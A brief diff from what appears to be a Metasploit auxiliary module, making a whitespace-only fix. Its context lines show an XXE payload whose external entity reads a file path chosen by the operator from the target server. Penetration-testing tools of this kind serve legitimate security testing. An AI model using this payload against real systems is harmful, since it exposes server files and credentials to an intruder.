@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
 
     pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
+<!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}" >]>
 <Request>
